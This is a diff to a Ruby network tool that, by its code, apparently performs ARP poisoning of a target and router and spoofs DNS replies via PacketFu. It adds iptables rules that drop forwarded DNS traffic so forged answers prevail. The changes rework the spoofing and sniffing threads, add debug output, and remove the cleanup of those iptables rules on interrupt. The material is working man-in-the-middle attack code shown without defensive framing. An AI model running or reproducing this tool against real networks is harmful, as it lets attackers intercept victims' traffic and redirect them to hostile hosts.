@@ -33,6 +33,7 @@ require 'thread'
 require 'macaddr'
 require 'optparse'
 require 'resolv'
+require 'pp'
 require_relative 'utils.rb'
 include PacketFu
 
@@ -174,7 +175,7 @@ def check_spoof(domainName)
 
   x = Resolv.getaddress domainName
 
-
+puts x
   return x
 rescue Resolv::ResolvError => e
   p e.message
@@ -366,6 +367,7 @@ def sniff(iface)
         next
       end
       spoof_ip = check_spoof(domain)
+      pp "SPOOFIP: " + spoof_ip.to_s
       if !spoof_ip.nil?
         #`iptables -A FORWARD -m u32 -p udp --dport 53 --u32 "0&0x0022=`+ packet.payload[0,2] +`"-j DROP`
         #`iptables -A FORWARD -m u32 -p udp --dport 53 --u32 "0&0x0022=#{packet.payload[0,2]} -j DROP`
@@ -386,26 +388,24 @@ end
 
 begin
 
-  #spoof_thread = Thread.new{runspoof(arp_packet_target,arp_packet_router)}
+
   `iptables -A FORWARD -p UDP --dport 53 -j DROP`
   `iptables -A FORWARD -p TCP --dport 53 -j DROP`
 
-  threads = []
-  puts "Starting the ARP poisoning thread..."
-  threads << Thread.new(runspoof(arp_packet_target, arp_packet_router))
-  puts "Starting the sniffing..."
-  threads << Thread.new(sniff($iface))
+  spoof_thread = Thread.new{runspoof(arp_packet_target,arp_packet_router)}
 
-  threads.each { |thr| thr.join}
-    
+
+  puts "Starting the sniffing..."
+  #sniff_thread = Thread.new{sniff($iface)}
+  sniff($iface)
+  spoof_thread.join
+  #sniff_thread.join
+  #Signal.trap("SIGINT") { Process.kill("INT", @pid); Process.wait; exit }
+
     # Catch the interrupt and kill the thread
 rescue Interrupt
   puts "\nDNS spoof stopped by interrupt signal."
   `echo 0 > /proc/sys/net/ipv4/ip_forward`
-  `iptables -D FORWARD -p UDP --dport 53 -j DROP`
-  `iptables -D FORWARD -p TCP --dport 53 -j DROP`
-  threads.each { |thr| Thread.kill(thr)}
-
   exit 0
 
 
